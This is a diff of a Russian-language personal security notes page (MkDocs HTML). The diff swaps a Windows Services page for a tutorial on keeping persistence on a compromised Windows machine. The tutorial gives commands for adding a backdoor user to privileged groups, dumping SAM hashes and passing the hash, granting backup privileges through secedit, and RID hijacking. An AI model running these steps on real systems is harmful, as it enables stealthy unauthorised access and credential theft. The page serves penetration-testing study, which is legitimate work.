@@ -12,20 +12,20 @@
         <meta name="author" content="Dmitrii Ivanov">
       
       
-        <link rel="canonical" href="https://ivanovds.ru/Windows/Windows_Services/">
+        <link rel="canonical" href="https://ivanovds.ru/Windows/Windows_persistence/">
       
       
-        <link rel="prev" href="../System_utilities/">
+        <link rel="prev" href="../windows_users/">
       
       
-        <link rel="next" href="../windows_users/">
+        <link rel="next" href="../../Technologies/">
       
       <link rel="icon" href="../../images/favicon.png">
       <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.18">
     
     
       
-        <title>Windows Services - ivanovds.ru</title>
+        <title>Способы закрепления в Windows - ivanovds.ru</title>
       
     
     
@@ -89,7 +89,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#windows-services-and-files" class="md-skip">
+        <a href="#windows" class="md-skip">
           Перейти к содержанию
         </a>
       
@@ -123,7 +123,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Windows Services
+              Способы закрепления в Windows
             
           </span>
         </div>
@@ -2058,59 +2058,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Windows Services
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Windows_Services/" class="md-nav__link">
         Windows Services
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Содержание раздела
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#lsass" class="md-nav__link">
-    lsass
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ntds" class="md-nav__link">
-    NTDS
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2134,11 +2086,92 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../Windows_persistence/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Способы закрепления в Windows
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         Способы закрепления в Windows
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Содержание раздела">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Содержание раздела
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    Модификация неадминистративных аккаунтов
+  </a>
+  
+    <nav class="md-nav" aria-label="Модификация неадминистративных аккаунтов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Добавление в локальные группы
+  </a>
+  
+    <nav class="md-nav" aria-label="Добавление в локальные группы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#backup-operators" class="md-nav__link">
+    Пример с добавлением в группу Backup Operators
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Специальные привилегии и дескрипторы безопасности
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rid" class="md-nav__link">
+    Подмена RID
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -2561,16 +2594,49 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#lsass" class="md-nav__link">
-    lsass
+  <a href="#_1" class="md-nav__link">
+    Модификация неадминистративных аккаунтов
+  </a>
+  
+    <nav class="md-nav" aria-label="Модификация неадминистративных аккаунтов">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    Добавление в локальные группы
+  </a>
+  
+    <nav class="md-nav" aria-label="Добавление в локальные группы">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#backup-operators" class="md-nav__link">
+    Пример с добавлением в группу Backup Operators
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#ntds" class="md-nav__link">
-    NTDS
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    Специальные привилегии и дескрипторы безопасности
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rid" class="md-nav__link">
+    Подмена RID
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2589,25 +2655,86 @@
                   
 
 
-<h1 id="windows-services-and-files">Windows Services and Files</h1>
-<hr />
-<h3 id="lsass">lsass</h3>
-<p>Local Security Authority Subsytem Service (<strong>lsass.exe</strong>) - один из основных сервисов Windows систем. Отвечает за:</p>
-<ul>
-<li>приминение политик безопасности</li>
-<li>верификацию входа пользователей в систему</li>
-<li>обработки изменения паролей</li>
-<li>создания <a href="https://en.wikipedia.org/wiki/Access_token">access token-ов</a></li>
-<li>запись в системный журнал событий безопасности.</li>
-</ul>
-<div class="admonition danger">
-<p class="admonition-title">Danger</p>
-<p><strong>Принудетельное завершение lsass.exe приведет к тому, что система потеряет доступ к любой учётной записи включая SYSTEM\NT AUTHORITY и выведет запрос на перезагрузку ОС.</strong></p>
-<p>В виду критической важности этого сервиса, под него часто мимикрируют различная малварь, включая <a href="../../CyberSec/Tools/Metasploit/">metasploit:meterpreter</a></p>
+<h1 id="windows">Закрепление в Windows</h1>
+<p>После получения первоначального доступа к скомпроментированной машине, нужно предусмотреть способы закрепления на ней - оставить бэкдор, для того, чтобы была возможность подключится к машине минуя, в терминах <a href="/CyberSec/Cyber_Kill_Chain">Cyber Kill Chain, Exploitation фазу</a></p>
+<p>Ниже перечисленны различные способы закрепления.</p>
+<h2 id="_1">Модификация неадминистративных аккаунтов</h2>
+<p>Модификация простых учётных записей позволит наделить их административными привилегиями не привлекая к себе дополнительного внимания. Далее различные способы осуществления вышесказанного.</p>
+<h3 id="_2">Добавление в локальные группы</h3>
+<p>Наиболее очевидный и самый топорный способ добавить в группу локальных администраторов, который позволит подключаться по RDP и использовать WMI:</p>
+<div class="language-text highlight"><span class="filename">Добавление в группу локальных администраторов</span><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>C:\&gt; net localgroup administrators hacked_user /add
+</span></code></pre></div>
+<p>Добавление в группу <code>Backup Operators</code> не позволит подключаться по RDP и WMI, однако даст возможность получить доступ к любому файлу или ветке реестра в системе минуя DACL</p>
+<p><div class="language-text highlight"><span class="filename">Добавление в группу Backup Operators</span><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>C:\&gt; net localgroup &quot;Backup Operators&quot; hacked_user /add
+</span></code></pre></div>
+Учётка будет добавлена, однако по умолчанию, группа <code>Backup Operators</code> отключена. Для её включения нужно изменить следующий ключ в реестре:</p>
+<div class="language-text highlight"><span class="filename">Включение группы Backup Operators</span><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>C:\&gt; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+</span></code></pre></div>
+<p>Для того, чтобы появилась возможность подключаться с такой учёткой по RDP или WMI, нужно добавить её в соответствующую группу:</p>
+<div class="language-text highlight"><span class="filename">Добавление в группу Remote management users</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>C:\&gt; net localgroup &quot;Remote Management Users&quot; hacked_user /add
+</span></code></pre></div>
+<h4 id="backup-operators">Пример с добавлением в группу Backup Operators</h4>
+<p>Предположим, что <code>hacked_user</code> уже добавлен в группы <code>Backup Operators</code> и <code>Remote Managment Users</code> и соответствующие ключи реестра установлены в нужные значения.</p>
+<div class="language-text highlight"><span class="filename">Использование Backup Operators для получения хэшей</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a># Подключаемся через evil-winrm к целевой машине
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>evil-winrm -i 10.10.10.10 -u hacked_user -p Pas5w0rd
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a># Получаем и скачиваем ключи реестра с хэшами паролей
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>C:\&gt; reg save hklm\system system.bak
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>C:\&gt; reg save hklm\sam sam.bak
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>C:\&gt; download system.bak
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>C:\&gt; download sam.bak
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a># Запускаем secretdump.py из impacket для дампа хэшей 
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL    
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a># Подключаемся к целевой машине через атаку Path-The-Hash
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>evil-winrm -i 10.10.10.10 -u Administrator -H 1cra18he6653f69e97034a4cb4ddbcc6
+</span></code></pre></div>
+<h3 id="_3">Специальные привилегии и дескрипторы безопасности</h3>
+<p>Результат похожий на добавление учётки в специальную группу можно достичь и другим путём - назначением учётке <a href="https://ivanovds.ru/CyberSec/Penetration_testing/Privilege_escalation/?h=злоупотребление+опасными+привилегиями#_8">специальных привилегий</a></p>
+<p>Интересовать нас будут: <code>SeBackupPrivilege</code> и <code>SeRestorePrivilege</code>
+Для назначения особых привилегий пользователю можно воспользоваться командой <code>secedit</code>. С её помощью можно выгрузить конфигурационный файл в котором назначаются привилегии:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>secedit /export /cfg config.inf
+</span></code></pre></div>
+после чего, нужно будет просто добавить через запятую (без пробела) нужного пользователя в строке с желаемыми привилегиями.</p>
+<p>Далее, нужно вернуть импортировать новый конфиг и залить его в систему:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>secedit /import /cfg config.inf /db config.sdb
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>secedit /configure /db config.sdb /cfg config.inf
+</span></code></pre></div>
+После вышеописанных манипуляция, пользователь будет обладать привелегиями <code>SeBackupPrivilege</code> и <code>SeRestorePrivilege</code>, что эквивалентно его нахождению в группе <code>Backup Operators</code>, однако пользователь всё же не сможет работать через WMI. Конечно, пользователя можно было бы добавить в группу <code>Remote Management Users</code>, однако есть более изящный пример, заключающийся в изменении параметров дескрипторов безопасности <code>Powershell</code>:</p>
+<p><div class="language-text highlight"><span class="filename">Открытие окна изменения дескрипторов безопасности Powershell</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+</span></code></pre></div>
+выдав нужному пользователю <code>Full Control</code> пользователь получит возможность подключатся через WMI.</p>
+<div class="admonition warning">
+<p class="admonition-title">Помни!</p>
+<p>Нужно не забывать, что для того, чтобы специальные привилегии работали должным образом нужно изменить параметр реестра <code>LocalAccountTokenFilterPolicy</code></p>
 </div>
-<h3 id="ntds">NTDS</h3>
-<p>Windows NT Directory Services - сервис используемый Microsoft для управления, поиска и организации сетевых ресурсов.</p>
-<p>Файл NTDS.dit - файл базы данных который распологается на контроллере домена и хранит сведения из Active Directory, включая пользователей, группы, хэши паролей.</p>
+<p>В итоге, если проверить изменённого таким образом пользователя без пристрастия - получим рядовую учётку не состоящую ни в каких подозрительных группах.</p>
+<h3 id="rid">Подмена RID</h3>
+<p>Способ заключается в подмене некоторых ключей реестра таким образом, что Windows будет считать простого пользователя администратором.</p>
+<p>Как известно, локальный администратор имеет RID=500, простые пользователи имеют RID &gt;= 1000. Для просмотра значений RID можно воспользоваться следующей командой wmic:
+```cmd title=Просмотр RID
+wmic useraccount get name,sid</p>
+<p>Name                SID
+Administrator       S-1-5-21-1966530601-3185510712-10604624-500
+DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
+Guest               S-1-5-21-1966530601-3185510712-10604624-501
+ordinary_user1      S-1-5-21-1966530601-3185510712-10604624-1008
+ordinary_user2      S-1-5-21-1966530601-3185510712-10604624-1009
+hacked_user         S-1-5-21-1966530601-3185510712-10604624-1010
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>!!!Info 
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    RID - последние 4 бита SID
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Для подмены нужно получить доступ к SAM кусту. Сделать это можно запустив `regedit` через `psexec`:
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>```cmd 
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>C:\sysinternals\psexec64.exe -i -s regedit
+</span></code></pre></div></p>
+<p>Переходим в <code>HKLM\SAM\SAM\Domains\Account\Users\</code> и находим ключ значение которого соответствует hacked_user RID в шестнадцатиричной системе счисления:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print(hex(1010))&quot;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>0x3f2
+</span></code></pre></div>
+Далее, в ключе <code>3f2</code> находим значение <code>F</code> которое на 30 позиции содержит в себе RID записанный в обратном порядке и заменяем его на RID Администратора: RID 500 = 0x0104 -&gt; <code>f401</code></p>
+<p>В итоге, после следующего входа пользователя <code>hacked_user</code> ОС определит его как локального Администратора.</p>
 
 
   
@@ -2636,7 +2763,7 @@
       <nav class="md-footer__inner md-grid" aria-label="Нижний колонтитул" >
         
           
-          <a href="../System_utilities/" class="md-footer__link md-footer__link--prev" aria-label="Назад: System utilities" rel="prev">
+          <a href="../windows_users/" class="md-footer__link md-footer__link--prev" aria-label="Назад: Windows Users" rel="prev">
             <div class="md-footer__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
             </div>
@@ -2645,20 +2772,20 @@
                 Назад
               </span>
               <div class="md-ellipsis">
-                System utilities
+                Windows Users
               </div>
             </div>
           </a>
         
         
           
-          <a href="../windows_users/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Windows Users" rel="next">
+          <a href="../../Technologies/" class="md-footer__link md-footer__link--next" aria-label="Вперед: Сервисы, протоколы, технологии" rel="next">
             <div class="md-footer__title">
               <span class="md-footer__direction">
                 Вперед
               </span>
               <div class="md-ellipsis">
-                Windows Users
+                Сервисы, протоколы, технологии
               </div>
             </div>
             <div class="md-footer__button md-icon">
